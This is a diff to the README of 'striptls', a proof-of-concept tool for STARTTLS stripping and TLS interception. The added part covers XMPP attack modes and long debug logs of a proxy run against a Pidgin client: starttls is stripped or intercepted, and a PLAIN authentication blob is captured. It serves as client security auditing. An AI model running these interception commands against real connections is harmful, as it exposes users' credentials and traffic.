@@ -21,16 +21,18 @@ poc implementation of STARTTLS stripping attacks
  * FTP.StripFromCapabilities
  * FTP.StripWithError
  * FTP.UntrustedIntercept
-* NNTP (untested)
+* NNTP
  * NNTP.StripFromCapabilities  
  * NNTP.StripWithError
  * NNTP.UntrustedIntercept
-* XMPP (untested)
+* XMPP
  * XMPP.StripFromCapabilities
+ * XMPP.StripInboundTLS
+ * XMPP.UntrustedIntercept
 
 ## Usage
 
-    #> python -m striptls --help	# if installed from pip/setup.py
+    #> python -m striptls --help    # from pip/setup.py
     #> python striptls --help       # from source / root folder
 	Usage: striptls [options]
 	
@@ -59,7 +61,8 @@ poc implementation of STARTTLS stripping attacks
                                 SMTP.StripFromCapabilities, SMTP.StripWithError,
                                 SMTP.StripWithInvalidResponseCode,
                                 SMTP.StripWithTemporaryError, SMTP.UntrustedIntercept,
-                                XMPP.StripFromCapabilities [default: ALL]
+                                XMPP.StripFromCapabilities, XMPP.StripInboundTLS,
+                                XMPP.UntrustedIntercept [default: ALL]
 
 
 ## Install (optional)
@@ -232,3 +235,78 @@ iterates all protocol specific cases on a per client basis and keeps track of cl
 	2016-01-31 15:59:08,407 - DEBUG    - <Session 0x1f46990> [client] => [server]          'rset\r\n'
 	2016-01-31 15:59:08,469 - DEBUG    - <Session 0x1f46990> [client] <= [server]          '250 OK\r\n'
 	2016-01-31 15:59:08,484 - WARNING  - <Session 0x1f46990> terminated.
+
+
+### XMPP Audit Trail
+
+Example: Pidgin with security disabled.
+
+#### XMPP.StripInboundTLS - Inbound Plain - Outbound TLS - in case server requires starttls
+
+        python striptls --listen 0.0.0.0:5222 --remote jabber.ccc.de:5222 -k ../server.pem
+        2016-02-05 16:53:28,842 - INFO     - <Proxy 0x7f08322ba310 listen=('0.0.0.0', 5222) target=('jabber.ccc.de', 5222)> ready.
+        ...
+        2016-02-05 16:53:30,401 - DEBUG    - <ProtocolDetect 0x7f083196a810 protocol_id=PROTO_XMPP len_history=0> - protocol detected (target port)
+        ...
+        2016-02-05 16:53:30,401 - INFO     - <Session 0x7f083196a7d0> client ('192.168.139.1', 56888) has connected
+        2016-02-05 16:53:30,402 - INFO     - <Session 0x7f083196a7d0> connecting to target ('jabber.ccc.de', 5222)
+        2016-02-05 16:53:30,923 - DEBUG    - <Session 0x7f083196a7d0> [client] => [server]          "<?xml version='1.0' ?><stream:stream to='jabber.ccc.de' xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' version='1.0'>"
+        2016-02-05 16:53:30,925 - DEBUG    - <RewriteDispatcher  - changed mangle: striptls.StripInboundTLS new: True>
+        2016-02-05 16:53:31,005 - DEBUG    - <Session 0x7f083196a7d0> [client] <= [server]          "<?xml version='1.0'?><stream:stream xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' id='13821701589972978594' from='jabber.ccc.de' version='1.0' xml:lang='en'>"
+        2016-02-05 16:53:31,009 - DEBUG    - <Session 0x7f083196a7d0> [client] <= [server]          "<stream:features><c xmlns='http://jabber.org/protocol/caps' hash='sha-1' node='http://www.process-one.net/en/ejabberd/' ver='bvEOjW9q8CEw8mw8ecNTLXvY5WQ='/><starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'><required/></starttls></stream:features>"
+        2016-02-05 16:53:31,012 - DEBUG    - <Session 0x7f083196a7d0> [client] => [server][mangled] "<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>"
+        2016-02-05 16:53:31,069 - DEBUG    - <Session 0x7f083196a7d0> [client] => [server][mangled] performing outbound SSL handshake
+        2016-02-05 16:53:31,199 - DEBUG    - <Session 0x7f083196a7d0> [client] <= [server][mangled] "<stream:features><c xmlns='http://jabber.org/protocol/caps' hash='sha-1' node='http://www.process-one.net/en/ejabberd/' ver='bvEOjW9q8CEw8mw8ecNTLXvY5WQ='/></stream:features>"
+        2016-02-05 16:53:31,203 - DEBUG    - <Session 0x7f083196a7d0> [client] => [server]          "<iq type='get' id='purple9f914f80'><query xmlns='jabber:iq:auth'><username>tin</username></query></iq>"
+        2016-02-05 16:53:31,259 - DEBUG    - <Session 0x7f083196a7d0> [client] <= [server]          "<?xml version='1.0'?><stream:stream xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' id='13515446948282835507' from='jabber.ccc.de' xml:lang='en'>"
+        2016-02-05 16:53:31,263 - DEBUG    - <Session 0x7f083196a7d0> [client] <= [server]          "<stream:error><invalid-namespace xmlns='urn:ietf:params:xml:ns:xmpp-streams'></invalid-namespace></stream:error>"
+        2016-02-05 16:53:31,266 - DEBUG    - <Session 0x7f083196a7d0> [client] <= [server]          '</stream:stream>'
+        2016-02-05 16:53:31,269 - WARNING  - <Session 0x7f083196a7d0> terminated.
+
+#### XMPP.StripFromCapabilities - strip starttls server annoucement
+
+        2016-02-05 16:53:34,633 - DEBUG    - <ProtocolDetect 0x7f083196a990 protocol_id=PROTO_XMPP len_history=0> - protocol detected (target port)
+        2016-02-05 16:53:34,633 - INFO     - <Session 0x7f083196a910> client ('192.168.139.1', 56890) has connected
+        2016-02-05 16:53:34,633 - INFO     - <Session 0x7f083196a910> connecting to target ('jabber.ccc.de', 5222)
+        2016-02-05 16:53:34,741 - DEBUG    - <Session 0x7f083196a910> [client] => [server]          "<?xml version='1.0' ?><stream:stream to='jabber.ccc.de' xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' version='1.0'>"
+        2016-02-05 16:53:34,742 - DEBUG    - <RewriteDispatcher  - changed mangle: striptls.StripFromCapabilities new: True>
+        2016-02-05 16:53:34,810 - DEBUG    - <Session 0x7f083196a910> [client] <= [server]          "<?xml version='1.0'?><stream:stream xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' id='12381525525258986322' from='jabber.ccc.de' version='1.0' xml:lang='en'>"
+        2016-02-05 16:53:34,814 - DEBUG    - <Session 0x7f083196a910> [client] <= [server]          "<stream:features><c xmlns='http://jabber.org/protocol/caps' hash='sha-1' node='http://www.process-one.net/en/ejabberd/' ver='bvEOjW9q8CEw8mw8ecNTLXvY5WQ='/><starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'><required/></starttls></stream:features>"
+        2016-02-05 16:53:34,816 - DEBUG    - <Session 0x7f083196a910> [client] <= [server][mangled] "<stream:features><c xmlns='http://jabber.org/protocol/caps' hash='sha-1' node='http://www.process-one.net/en/ejabberd/' ver='bvEOjW9q8CEw8mw8ecNTLXvY5WQ='/></stream:features>"
+        2016-02-05 16:53:34,869 - DEBUG    - <Session 0x7f083196a910> [client] => [server]          "<iq type='get' id='purplecfe2ee07'><query xmlns='jabber:iq:auth'><username>tin</username></query></iq>"
+        2016-02-05 16:53:34,920 - DEBUG    - <Session 0x7f083196a910> [client] <= [server]          "<stream:error><policy-violation xmlns='urn:ietf:params:xml:ns:xmpp-streams'></policy-violation><text xml:lang='' xmlns='urn:ietf:params:xml:ns:xmpp-streams'>Use of STARTTLS required</text></stream:error></stream:stream>"
+        2016-02-05 16:53:34,926 - WARNING  - <Session 0x7f083196a910> terminated.
+
+#### XMPP.StripUntrustedIntercept - TLS Interception inbound and outbound with own certificate/key
+
+        2016-02-05 16:53:42,799 - DEBUG    - <ProtocolDetect 0x7f083196aa90 protocol_id=PROTO_XMPP len_history=0> - protocol detected (target port)
+        2016-02-05 16:53:42,799 - INFO     - <Session 0x7f083196a8d0> client ('192.168.139.1', 56892) has connected
+        2016-02-05 16:53:42,799 - INFO     - <Session 0x7f083196a8d0> connecting to target ('jabber.ccc.de', 5222)
+        2016-02-05 16:53:42,901 - DEBUG    - <Session 0x7f083196a8d0> [client] => [server]          "<?xml version='1.0' ?><stream:stream to='jabber.ccc.de' xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' version='1.0'>"
+        2016-02-05 16:53:42,903 - DEBUG    - <RewriteDispatcher  - changed mangle: striptls.UntrustedIntercept new: True>
+        2016-02-05 16:53:42,980 - DEBUG    - <Session 0x7f083196a8d0> [client] <= [server]          "<?xml version='1.0'?><stream:stream xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' id='10051743579572304948' from='jabber.ccc.de' version='1.0' xml:lang='en'><stream:features><c xmlns='http://jabber.org/protocol/caps' hash='sha-1' node='http://www.process-one.net/en/ejabberd/' ver='bvEOjW9q8CEw8mw8ecNTLXvY5WQ='/><starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'><required/></starttls></stream:features>"
+        2016-02-05 16:53:42,984 - DEBUG    - <Session 0x7f083196a8d0> [client] => [server]          "<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>"
+        2016-02-05 16:53:42,986 - DEBUG    - <Session 0x7f083196a8d0> [client] <= [server][mangled] "<proceed xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>"
+        2016-02-05 16:53:43,006 - DEBUG    - <Session 0x7f083196a8d0> [client] <= [server][mangled] waiting for inbound SSL Handshake
+        2016-02-05 16:53:43,008 - DEBUG    - <Session 0x7f083196a8d0> [client] => [server]          "<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>"
+        2016-02-05 16:53:43,060 - DEBUG    - <Session 0x7f083196a8d0> [client] => [server][mangled] performing outbound SSL handshake
+        2016-02-05 16:53:43,219 - DEBUG    - <Session 0x7f083196a8d0> [client] => [server][mangled] None
+        2016-02-05 16:53:43,221 - DEBUG    - <Session 0x7f083196a8d0> [client] => [server]          '<'
+        2016-02-05 16:53:43,225 - DEBUG    - <Session 0x7f083196a8d0> [client] => [server]          "stream:stream to='jabber.ccc.de' xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' version='1.0'>"
+        2016-02-05 16:53:43,369 - DEBUG    - <Session 0x7f083196a8d0> [client] <= [server]          "<?xml version='1.0'?><stream:stream xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' id='6938642107398534259' from='jabber.ccc.de' version='1.0' xml:lang='en'>"
+        2016-02-05 16:53:43,379 - DEBUG    - <Session 0x7f083196a8d0> [client] <= [server]          "<stream:features><c xmlns='http://jabber.org/protocol/caps' hash='sha-1' node='http://www.process-one.net/en/ejabberd/' ver='bvEOjW9q8CEw8mw8ecNTLXvY5WQ='/><register xmlns='http://jabber.org/features/iq-register'/><mechanisms xmlns='urn:ietf:params:xml:ns:xmpp-sasl'><mechanism>PLAIN</mechanism><mechanism>X-OAUTH2</mechanism><mechanism>SCRAM-SHA-1</mechanism></mechanisms></stream:features>"
+        2016-02-05 16:53:43,423 - DEBUG    - <Session 0x7f083196a8d0> [client] => [server]          '<'
+        2016-02-05 16:53:43,426 - DEBUG    - <Session 0x7f083196a8d0> [client] => [server]          "auth xmlns='urn:ietf:params:xml:ns:xmpp-sasl' mechanism='PLAIN' xmlns:ga='http://www.google.com/talk/protocol/auth' ga:client-uses-full-bind-result='true'>AHRpbgB4eA==</auth>"
+        2016-02-05 16:53:43,581 - DEBUG    - <Session 0x7f083196a8d0> [client] <= [server]          "<failure xmlns='urn:ietf:params:xml:ns:xmpp-sasl'><not-authorized/></failure>"
+        2016-02-05 16:53:43,611 - DEBUG    - <Session 0x7f083196a8d0> [client] => [server]          '<'
+        2016-02-05 16:53:43,616 - DEBUG    - <Session 0x7f083196a8d0> [client] => [server]          '/stream:stream>'
+        2016-02-05 16:53:43,620 - WARNING  - <Session 0x7f083196a8d0> terminated.
+
+#### XMPP Audit results
+
+        2016-02-05 16:53:46,352 - WARNING  - Ctrl C - Stopping server
+        2016-02-05 16:53:46,353 - INFO     -  -- audit results --
+        2016-02-05 16:53:46,353 - INFO     - [*] client: 192.168.139.1
+        2016-02-05 16:53:46,353 - INFO     -     [Vulnerable!] <class striptls.StripInboundTLS at 0x7f08319a6808>
+        2016-02-05 16:53:46,353 - INFO     -     [Vulnerable!] <class striptls.StripFromCapabilities at 0x7f08319a67a0>
+        2016-02-05 16:53:46,353 - INFO     -     [Vulnerable!] <class striptls.UntrustedIntercept at 0x7f08319a6870>
